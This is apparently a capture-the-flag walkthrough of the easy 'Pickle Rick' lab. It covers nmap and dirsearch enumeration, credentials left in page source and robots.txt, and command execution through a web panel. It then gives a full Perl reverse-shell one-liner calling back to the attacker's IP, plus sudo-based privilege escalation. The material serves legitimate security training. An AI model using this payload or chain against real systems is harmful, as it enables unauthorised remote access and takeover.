## Pickle Rick Room
# Difficulty: Easy

When we first paste the ip into google we get meeted with a webpage.

![image](https://user-images.githubusercontent.com/66257304/131914496-9a5e01b4-ad90-4a55-b779-d04c8bfac683.png)

If we view the source code we see that Rick has left his username as a comment (Silly Rick).

![image](https://user-images.githubusercontent.com/66257304/131914660-aa60069f-f434-41c8-a0c3-f1a13c04673f.png)

# NMAP

Now we should run an nmap scan, use the command `nmap -sC -sV -A [IP]` to see all open ports.

Looks like just port 80 and 22 are open, we dont have mutch to go at here.

![image](https://user-images.githubusercontent.com/66257304/131915021-d402173f-fc19-41cc-b4e5-b255e3f70986.png)

# Dirsearch

Let's run a Dirsearch scan to see if there are any hidden directories.

Use the command `dirsearch -u http://[IP]`

We see there is a robots.txt file, lets have a look.

![image](https://user-images.githubusercontent.com/66257304/131916879-5ed1a304-5044-403b-951f-f2e65cc33f1b.png)

Seem's to just be one of Rick's CatchPhrases, right?

We also see there is a /login.php.

![image](https://user-images.githubusercontent.com/66257304/131916705-75985f80-4b2e-413e-98b7-fd80d12460d8.png)

Let's go to that shall we.

![image](https://user-images.githubusercontent.com/66257304/131916751-28372432-f449-4085-9a50-15efda187ad4.png)

Okay, so now we have a login page, we have Rick's username from earlier but we dont have a password, oh wait, what about Rick's silly thing in the robots.txt file, that might work?

![image](https://user-images.githubusercontent.com/66257304/131917166-fa575c72-7bb1-4e22-96aa-77500ebfa4f9.png)

And Boom, we are in.

Hmmm, seems we can run commands, lets try `ls` to see if it works.

![image](https://user-images.githubusercontent.com/66257304/131917272-e925a713-1cc3-44bb-8255-b640bf8dcb63.png)

And it does, and we see a file called Sup3rS3cretPickl3Ingred.txt, what if we cat that out?

![image](https://user-images.githubusercontent.com/66257304/131917379-a86799e6-47f3-4342-9077-9008ca12510d.png)

Damn...

Looks like were going to have to get a reverse shell, lets set up a listener on port 4242 using the command `nc -lvnp 4242`. 

Then lets use the command `perl -e 'use Socket;$i="[YOUR IP]";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

Now we see a call back on our listener.

![image](https://user-images.githubusercontent.com/66257304/131918250-53c5acb4-7112-47d7-b2c2-e2f5240f6dc3.png)

Now we can cat out that Sup3rS3cretPickl3Ingred.txt file and find the first ingredient.

If we move to /home/rick we find the second ingredient so we can cat out that and answer the question.

If we run the command `sudo -l` we find out that we can run anything as sudo with no passwords (How Crazy) 

If we try to `ls /root` we will get a permission denied error, but since we can run commands as sudo we can run the command `sudo ls /root/3rd.txt` to read out the final ingredient.

Well Done!

